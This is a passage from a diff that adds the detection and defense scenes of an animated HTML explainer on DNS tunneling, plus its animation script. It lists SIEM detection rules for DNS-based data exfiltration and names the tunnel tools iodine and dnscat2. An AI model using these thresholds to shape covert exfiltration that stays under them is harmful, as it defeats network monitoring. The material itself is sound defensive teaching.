+            <div style="font-size:7px;color:#888;margin-bottom:3px">LOW · HIGH ENTROPY SUBDOMAIN</div>
+            <div style="font-size:6px;color:#666;line-height:1.7">Base64/hex patterns in subdomain (random-looking strings 32+ chars). Possible encoding detected.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step-block am" id="s4-s1">
+        <div class="step-num am">01</div>
+        <div class="step-text">Normal workstations make <span class="am">~30–100 DNS queries/hour</span>. DNS tunneling generates thousands per minute. Volume anomaly detection in SIEM catches this. Baseline normal, alert on deviation.</div>
+      </div>
+      <div class="step-block am" id="s4-s2">
+        <div class="step-num am">02</div>
+        <div class="step-text"><span class="am">Query length</span> is the strongest signal. Normal FQDN: 20–40 chars. Tunnel queries: 100–200 chars of base64. Write a SIEM rule: <span class="cy">dns.query.length &gt; 100 → alert HIGH</span>.</div>
+      </div>
+      <div class="step-block am" id="s4-s3">
+        <div class="step-num am">03</div>
+        <div class="step-text"><span class="am">Shannon entropy</span> of subdomain labels. "aGVsbG8gd29ybGQ" has high entropy (looks random). "mail.google.com" has low entropy. High entropy + unusual domain = tunnel indicator. Tools: Zeek, Suricata DNS scripts.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info am">
+    <div class="il">DETECTION STRATEGY</div>
+    <div class="ih am">Volume + length + entropy. Three signals, one alert.</div>
+    <div class="il" style="font-size:7px">DNS logging is often disabled by default. Enable it first. Then: SIEM rules on query length &gt;100, volume &gt;1000/min/host, TXT queries to unknown domains, and high-entropy subdomains.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv am">&gt;100</div><div class="sl">char query<br>= suspicious</div></div>
+    <div class="sc"><div class="sv rd">1000+</div><div class="sl">queries/min<br>= tunnel</div></div>
+    <div class="sc"><div class="sv cy">entropy</div><div class="sl">random chars<br>= encoded</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="goScene(3)">◀ PREV</button>
+    <button class="btn play" onclick="playScene(4)">▶ PLAY</button>
+    <button class="btn" onclick="goScene(5)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════ SCENE 5: DEFENSES ══════════════════ -->
+<div class="scene" id="s5" style="background:#060f06">
+  <div class="hdr" style="background:#060f06">
+    <div class="hdr-title" style="color:#4eff9a">DEFENSES & MITIGATIONS</div>
+    <div class="hdr-sub">DNS FIREWALL · LOGGING · RPZ · INSPECTION</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+    </div>
+  </div>
+  <div class="slr">
+    <span class="slabel" style="color:#4eff9a">DEFEND</span>
+    <span class="sbadge" style="color:#4eff9a;border-color:#4eff9a">MITIGATIONS</span>
+  </div>
+
+  <div class="anim" style="background:#060f06">
+    <div style="padding:10px 14px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <div id="s5-intro" style="text-align:center;font-size:7px;color:#444;letter-spacing:2px;opacity:0;transition:opacity .4s">LAYERED DNS SECURITY CONTROLS</div>
+
+      <div class="def-card" id="d1" style="border:2px solid #4eff9a;border-radius:3px;padding:10px;background:#040c04">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
+          <span style="font-size:16px">🔒</span>
+          <div style="font-size:8px;color:#4eff9a">FORCE DNS THROUGH INTERNAL RESOLVER</div>
+        </div>
+        <div style="font-size:7px;color:#aaa;line-height:1.8">Block direct UDP/TCP port 53 to external IPs. Force all DNS through your internal resolver. Internal resolver can log, filter, and block malicious domains. Attacker can't bypass your resolver.</div>
+        <div style="font-size:6px;color:#555;margin-top:4px">iptables: <span style="color:#4eff9a">FORWARD -p udp --dport 53 ! -d [resolver] -j DROP</span></div>
+      </div>
+
+      <div class="def-card" id="d2" style="border:2px solid #4ec9e1;border-radius:3px;padding:10px;background:#04060c">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
+          <span style="font-size:16px">📋</span>
+          <div style="font-size:8px;color:#4ec9e1">DNS RESPONSE POLICY ZONES (RPZ)</div>
+        </div>
+        <div style="font-size:7px;color:#aaa;line-height:1.8">Block known malicious domains at resolver level. Subscribe to threat intel feeds (ESET, Cloudflare Gateway, Cisco Umbrella). Any query to blocklisted C2 domains returns NXDOMAIN. Blocks iodine/dnscat2 before tunnel forms.</div>
+      </div>
+
+      <div class="def-card" id="d3" style="border:2px solid #e8a020;border-radius:3px;padding:10px;background:#0c0800">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
+          <span style="font-size:16px">📊</span>
+          <div style="font-size:8px;color:#e8a020">FULL DNS LOGGING + SIEM</div>
+        </div>
+        <div style="font-size:7px;color:#aaa;line-height:1.8">Enable query logging on all resolvers. Forward to SIEM. Rules: <span style="color:#e8a020">query_length &gt; 100</span>, <span style="color:#e8a020">queries/min/host &gt; 500</span>, <span style="color:#e8a020">TXT records to unknown domains</span>. Zeek has built-in DNS tunnel scripts.</div>
+      </div>
+
+      <div class="def-card" id="d4" style="border:2px solid #a060c0;border-radius:3px;padding:10px;background:#0d0818">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
+          <span style="font-size:16px">🔭</span>
+          <div style="font-size:8px;color:#a060c0">DNS INSPECTION + DPI</div>
+        </div>
+        <div style="font-size:7px;color:#aaa;line-height:1.8">Deep packet inspection on DNS traffic. Detect base64/hex patterns in subdomains. Tools: <span style="color:#a060c0">Suricata with dns-tunnel rules</span>, Palo Alto DNS Security, Cisco Umbrella. Rate-limit TXT and NULL record responses.</div>
+      </div>
+
+      <div id="s5-limit" style="border:1px solid #0d2010;border-radius:3px;padding:10px;background:#040c04;opacity:0;transition:opacity .5s;text-align:center">
+        <div style="font-size:7px;color:#555;margin-bottom:6px">THE FUNDAMENTAL TENSION</div>
+        <div style="font-size:7px;color:#ccc;line-height:2;text-align:left">
+          <span style="color:#e85050">Problem:</span> You can't block DNS entirely<br>
+          <span style="color:#e8a020">Reality:</span> Only detect + alert on anomalies<br>
+          <span style="color:#4eff9a">Best defense:</span> Internal resolver + RPZ + logging<br>
+          <span style="color:#4ec9e1">Nuclear option:</span> DNS-over-HTTPS to known resolver
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info gn">
+    <div class="il">KEY INSIGHT</div>
+    <div class="ih gn">You can't block DNS. You must monitor it.</div>
+    <div class="il" style="font-size:7px">Force traffic through your resolver, log everything, and alert on anomalies. Cloudflare Gateway and Cisco Umbrella include DNS tunnel detection as a feature. Enable DNS logging today — it's off by default on most resolvers.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">RPZ</div><div class="sl">block C2<br>at resolver</div></div>
+    <div class="sc"><div class="sv cy">Zeek</div><div class="sl">DNS tunnel<br>detection</div></div>
+    <div class="sc"><div class="sv pu">log all</div><div class="sl">query logs<br>first step</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="goScene(4)">◀ PREV</button>
+    <button class="btn play" onclick="playScene(5)">▶ PLAY</button>
+    <button class="btn gn" onclick="goScene(1)">↩ RESTART</button>
+  </div>
+</div>
+
+<script>
+let currentScene=1;
+let timers=[];
+function clearTimers(){timers.forEach(t=>clearTimeout(t));timers=[];}
+function delay(fn,ms){timers.push(setTimeout(fn,ms));}
+function setOp(id,v){const el=document.getElementById(id);if(el)el.style.opacity=v;}
+function addV(id){const el=document.getElementById(id);if(el)el.classList.add('visible');}
+function rmV(id){const el=document.getElementById(id);if(el)el.classList.remove('visible');}
+function svgOp(id,v){const el=document.getElementById(id);if(el)el.setAttribute('opacity',v);}
+function goBeam(id,ms){
+  const el=document.getElementById(id);
+  if(el){el.style.transition=`stroke-dashoffset ${ms}ms ease-out`;el.style.strokeDashoffset='0';}
+}
+function resetBeam(id){
+  const el=document.getElementById(id);
+  if(el){el.style.transition='none';el.style.strokeDashoffset='200';}
+}
+
+function goScene(n){
+  clearTimers();
+  document.getElementById('s'+currentScene).classList.remove('active');
+  currentScene=n;
+  document.getElementById('s'+n).classList.add('active');
+  resetScene(n);
+  playScene(n);
+}
+
+function resetScene(n){
+  if(n===1){
+    ['s1-hero','s1-fw','s1-query','s1-cta'].forEach(id=>setOp(id,'0'));
+  }
+  if(n===2){
+    document.getElementById('s2-hero').classList.remove('visible');
+    setOp('s2-encode','0');
+    ['s2-s1','s2-s2'].forEach(id=>rmV(id));
+    ['ck1','ck2','ck3','ck4','ck5'].forEach(id=>rmV(id));
+    ['s2-b1','s2-b2','s2-b3','s2-b4','s2-b5','s2-b6'].forEach(id=>resetBeam(id));
+    ['s2-blk1','s2-blk2','s2-blk3',
+     's2-qlbl','s2-qt1','s2-qt2','s2-qt3','s2-resp-lbl',
+     's2-allowed','s2-allowed2',
+     's2-b1tip','s2-b2tip','s2-b3tip',
+     's2-b4tip','s2-b5tip','s2-b6tip'].forEach(id=>svgOp(id,'0'));
+  }
+  if(n===3){
+    setOp('s3-term','0'); setOp('s3-tools','0');
+    ['s3-s1','s3-s2','s3-s3'].forEach(id=>rmV(id));
+  }
+  if(n===4){
+    setOp('s4-compare','0'); setOp('s4-siem','0');
+    ['s4-s1','s4-s2','s4-s3'].forEach(id=>rmV(id));
+    ['dr1','dr2','dr3','dr4'].forEach(id=>rmV(id));
+  }
+  if(n===5){
+    setOp('s5-intro','0'); setOp('s5-limit','0');
+    ['d1','d2','d3','d4'].forEach(id=>rmV(id));
+  }
+}
+
+function playScene(n){
+  clearTimers();resetScene(n);
+
+  if(n===1){
+    delay(()=>setOp('s1-hero','1'),200);
+    delay(()=>setOp('s1-fw','1'),900);
+    delay(()=>setOp('s1-query','1'),1700);
+    delay(()=>setOp('s1-cta','1'),2400);
+  }
+
+  if(n===2){
+    delay(()=>document.getElementById('s2-hero').classList.add('visible'),200);
+    // show firewall badges
+    delay(()=>{ svgOp('s2-allowed','1'); svgOp('s2-allowed2','1'); },500);
+    delay(()=>{ svgOp('s2-blk1','1'); svgOp('s2-blk2','1'); svgOp('s2-blk3','1'); },700);
+    // forward beams + tips
+    delay(()=>{ goBeam('s2-b1',300); svgOp('s2-b1tip','1'); },900);
+    delay(()=>{ goBeam('s2-b2',300); svgOp('s2-b2tip','1'); },1100);
+    delay(()=>{ goBeam('s2-b3',500); svgOp('s2-b3tip','1'); },1300);
+    // query label
+    delay(()=>{ svgOp('s2-qlbl','1'); svgOp('s2-qt1','1'); svgOp('s2-qt2','1'); svgOp('s2-qt3','1'); },1600);
+    // response beams + tips
+    delay(()=>{ goBeam('s2-b4',400); svgOp('s2-b4tip','1'); },2000);
+    delay(()=>{ goBeam('s2-b5',300); svgOp('s2-b5tip','1'); },2300);
+    delay(()=>{ goBeam('s2-b6',300); svgOp('s2-b6tip','1'); svgOp('s2-resp-lbl','1'); },2500);
+    // encoding breakdown
+    delay(()=>{
+      setOp('s2-encode','1');
+      ['ck1','ck2','ck3','ck4','ck5'].forEach((id,i)=>delay(()=>addV(id),i*200));
+    },1500);
+    delay(()=>addV('s2-s1'),700);
+    delay(()=>addV('s2-s2'),1800);
+  }
+
+  if(n===3){
+    delay(()=>setOp('s3-term','1'),200);
+    for(let i=1;i<=12;i++) delay(()=>{
+      const el=document.getElementById('t'+i);
+      if(el){ el.style.opacity='1'; }
+    }, 400+i*250);
+    delay(()=>setOp('s3-tools','1'),3500);
+    delay(()=>addV('s3-s1'),600);
+    delay(()=>addV('s3-s2'),1800);
+    delay(()=>addV('s3-s3'),3000);
+  }
+
+  if(n===4){
+    delay(()=>setOp('s4-compare','1'),200);
+    delay(()=>{
+      setOp('s4-siem','1');
+      ['dr1','dr2','dr3','dr4'].forEach((id,i)=>delay(()=>addV(id),i*350));
+    },800);
+    delay(()=>addV('s4-s1'),500);
+    delay(()=>addV('s4-s2'),1200);
+    delay(()=>addV('s4-s3'),2100);
+  }
+
+  if(n===5){
+    delay(()=>setOp('s5-intro','1'),200);
+    delay(()=>addV('d1'),500);
+    delay(()=>addV('d2'),1000);
+    delay(()=>addV('d3'),1500);
+    delay(()=>addV('d4'),2000);
+    delay(()=>setOp('s5-limit','1'),2600);
+  }
+}
+
+window.addEventListener('load',()=>playScene(1));
+</script>
+</body>
+</html>
